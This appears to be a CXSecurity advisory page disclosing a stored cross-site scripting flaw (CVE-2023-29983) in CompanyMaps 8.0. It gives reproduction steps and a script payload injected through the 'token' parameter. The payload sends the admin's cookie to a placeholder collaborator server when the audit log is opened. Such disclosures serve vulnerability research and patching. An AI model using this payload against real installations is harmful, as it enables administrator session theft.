---
title: CompanyMaps 8.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023050007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-04
fetch_date: 2025-10-04T11:36:47.090226
---

# CompanyMaps 8.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CompanyMaps 8.0 Cross Site Scripting** **2023.05.03**  Credit:  **[Lucas Noki](https://cxsecurity.com/author/Lucas%2BNoki/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-29983](https://cxsecurity.com/cveshow/CVE-2023-29983/ "Click to see CVE-2023-29983")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Stored Cross Site Scripting
# Google Dork:
# Date: 27.04.2023
# Exploit Author: Lucas Noki (0xPrototype)
# Vendor Homepage: https://github.com/vogtmh
# Software Link: https://github.com/vogtmh/cmaps
# Version: 8.0
# Tested on: Mac, Windows, Linux
# CVE : CVE-2023-29983
\*Steps to reproduce:\*
1. Clone the repository and install the application
2. Send a maliciously crafted payload via the "token" parameter to the following endpoint: /rest/update/?token=
3. The payload used is: <script>new+Image().src=`http://YOUR\_COLLABORATOR\_SERVER/?c=${document.cookie}`</script>
4. Simply visiting the complete URL: http://IP/rest/update/?token=PAYLOAD is enough.
5. Login into the admin panel and go to the auditlog under: /admin/index.php?tab=auditlog
6. Check your collaborator server. You should have a request where the admins cookie is the value of the c parameter
In a real world case you would need to wait for the admin to log into the application and open the auditlog tab.
Special thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top